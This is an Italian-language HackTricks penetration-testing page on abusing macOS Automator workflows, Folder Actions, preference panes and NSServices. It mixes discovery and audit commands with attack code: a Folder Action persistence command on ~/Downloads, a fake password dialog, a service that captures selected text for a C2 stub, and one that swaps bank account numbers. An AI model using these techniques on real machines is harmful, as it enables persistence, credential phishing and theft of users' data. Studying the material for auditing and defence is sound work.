# Abuse di macOS Automator, Preference Panes e NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions e Workflows

### Informazioni di base

**Automator** è lo strumento visuale di macOS per l'automazione. Esegue **workflows** (bundle `.workflow`) composti da **actions** (bundle `.action`). Automator alimenta anche l'integrazione con **Folder Actions**, **Quick Actions** e **Shortcuts**. Nelle versioni moderne di macOS, i workflows possono anche essere **importati in Shortcuts**, quindi la stessa logica malevola può apparire come una Finder Quick Action, un user service in `~/Library/Services/` o uno shortcut basato su Automator actions legacy.

Le Automator actions sono **plugin** caricati nel runtime di Automator quando viene eseguito un workflow. Possono:
- Eseguire shell scripts arbitrari
- Elaborare file e dati
- Interagire con le applicazioni tramite AppleScript
- Concatenarsi per creare automazioni complesse

### Perché è importante

> [!WARNING]
> Gli Automator workflows possono essere eseguiti tramite **social engineering** — appaiono come semplici file di documenti. Un bundle `.workflow` può contenere shell commands incorporati che vengono eseguiti quando il workflow viene avviato. In combinazione con le Folder Actions, forniscono una **persistence automatica** che si attiva in risposta agli eventi sui file. Le recenti correzioni di Gatekeeper hanno inoltre dimostrato che le **Quick Actions incluse nelle app** (`Contents/PlugIns/*.workflow`) devono essere trattate come contenuto eseguibile, non come dati innocui.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attacco: Social-Engineered Workflow

Un bundle `.workflow` appare come un normale file di documento alla maggior parte degli utenti:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions eseguono automaticamente un workflow quando i file vengono aggiunti a una cartella monitorata:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistono tra i riavvii e vengono eseguite silenziosamente. Una Folder Action su `~/Downloads` significa che **ogni file scaricato attiva il tuo payload** — inclusi i file provenienti da Safari, Chrome, AirDrop e gli allegati email. Nota inoltre che `System Events` può registrare Folder Actions che puntano a script al di fuori delle posizioni predefinite `~/Library/Scripts/Folder Action Scripts`, rendendo utile la ricerca di percorsi non collegati. Per le implicazioni TCC correlate, consulta [la pagina TCC](../macos-security-protections/macos-tcc/README.md).

---

## Pannelli delle preferenze

### Informazioni di base

I pannelli delle preferenze (bundle `.prefPane`) sono plugin caricati da **System Settings** (in precedenza System Preferences). Forniscono pannelli UI di configurazione per funzionalità di sistema o di terze parti. Sui sistemi più vecchi venivano caricati direttamente da `System Preferences`; nelle versioni più recenti, i pannelli di terze parti vengono comunemente gestiti da un **legacy loader XPC service** avviato da System Settings.

### Perché è importante

- I pannelli delle preferenze vengono eseguiti in un **trusted host process** avviato da System Settings / System Preferences
- Sui sistemi moderni, tale host può essere un **`legacyLoader` XPC service**, quindi il confine importante rimane **trusted Apple UI process -> caricamento di codice di terze parti**
- I pannelli delle preferenze di terze parti ereditano il **contesto di sicurezza del processo host** e la fiducia dell'utente associata a quella UI
- Gli utenti installano i pannelli delle preferenze facendo **doppio clic** su di essi — un facile vettore di social engineering
- Una volta installati, **persistono** e vengono caricati ogni volta che System Settings apre quel pannello

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Un preference pane malevolo eredita il **contesto di sicurezza dell'host del pane** (storicamente `System Preferences`, nelle versioni più recenti spesso un helper `legacyLoader` avviato da `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attacco: Persistenza tramite installazione
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Un preference pane può imitare pannelli UI di sistema legittimi per **effettuare il phishing delle credenziali**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informazioni di base

**NSServices** consentono alle applicazioni di fornire funzionalità ad altre app tramite il **menu Services** (clic destro → Services). Quando un utente seleziona testo o dati e richiama un service, i dati selezionati vengono **inviati al service provider** per l'elaborazione.

I Services vengono dichiarati nell'`Info.plist` di un'applicazione tramite la chiave `NSServices` e registrati con il pasteboard server (`pbs`). macOS mantiene inoltre una **cache dei Services** e una **policy di restrizione** che determinano quali Services sono visibili e se i chiamanti sandboxed devono ricevere un avviso aggiuntivo.

### Perché è importante

- I Services ricevono un **flusso di dati tra applicazioni**: il testo selezionato da qualsiasi applicazione viene inviato al service
- Un service malevolo cattura dati da password manager, client email e applicazioni finanziarie
- I Services possono **restituire dati modificati** all'applicazione chiamante (man-in-the-middle sulle operazioni di selezione)
- I nomi dei Services possono essere creati in modo da sembrare legittimi ("Format Text", "Encrypt Selection", "Share")
- Il flag opzionale `NSRestricted` è rilevante per la sicurezza: un service contrassegnato come unrestricted può essere richiamato da un'app sandboxed senza l'avviso mostrato da macOS per i Services che possono causare un escape<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Modifica dei dati (Man-in-the-Middle)

Un servizio può **modificare i dati restituiti** fingendo di fornire una funzione legittima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Servizi con restrizioni e abusi moderni

Apple supporta un booleano `NSRestricted` opzionale per ogni definizione di servizio. Se è impostato, macOS avvisa i chiamanti sottoposti a sandbox perché il servizio potrebbe aiutarli a **uscire dai limiti della sandbox o della privacy**. Dal punto di vista offensivo, questo offre due utili percorsi di audit:

- Cercare **servizi di terze parti non contrassegnati come restricted** anche se fanno da proxy per Apple Events, accesso ai file o altre azioni con privilegi
- Cercare **servizi integrati di elevato valore** con entitlement potenti (ad esempio, servizi esposti da Script Editor o helper supportati da Finder) e verificare se l'interazione dell'utente sia sufficiente a trasformarli in una primitiva di accesso ai dati

Un buon esempio recente è **CVE-2022-48574**, in cui il meccanismo Services poteva essere abusato per raggiungere **file utente protetti da TCC senza il previsto flusso di conferma**. Il bug è stato corretto, ma la tecnica rimane utile per il threat modeling: qualsiasi servizio che inoltri richieste di accesso ai file o di automazione per conto del chiamante merita lo stesso livello di attenzione.<sup>[[2]](#references)</sup>

---

## Note recenti sulla sicurezza

- **Le Quick Actions sono contenuti eseguibili**: Apple ha corretto nel 2024 un bypass di Gatekeeper in cui una Quick Action di Automator inclusa in un'app poteva essere eseguita senza la normale valutazione. Durante l'audit delle app, esaminare `Contents/PlugIns/*.workflow/Contents/document.wflow` esattamente come si esaminerebbero helper script o login item. Vedere [la pagina di Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Le Shortcuts possono ereditare il comportamento legacy di Automator**: Apple ha inoltre aggiunto un ulteriore prompt di consenso dell'utente dopo che alcune shortcut di terze parti sono state scoperte mentre utilizzavano una **legacy Automator action** per inviare Apple Events senza il previsto flusso di autorizzazione. I workflow importati e i bundle delle shortcut dovrebbero essere esaminati alla ricerca di `Run AppleScript`, `Run Shell Script` e azioni bridge simili. Vedere [la pagina di TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator è ancora un confine attivo per la privacy**: nel 2025 Apple ha distribuito un'altra correzione per Automator relativa all'accesso ai dati utente protetti. Anche se Automator è una superficie legacy, qualsiasi workflow runner, host di Quick Action o bridge di automazione deve essere trattato come una superficie di attacco attuale, non come codice morto.

---

## Catene di attacco cross-technique

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Pannello delle preferenze → Escalation TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Furto dal gestore di password
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Riferimenti

- [1] [Apple — Informazioni sui contenuti di sicurezza di macOS Ventura 13.7, Sonoma 14.7 e Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Come funzionava l'exploit NSServices su macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
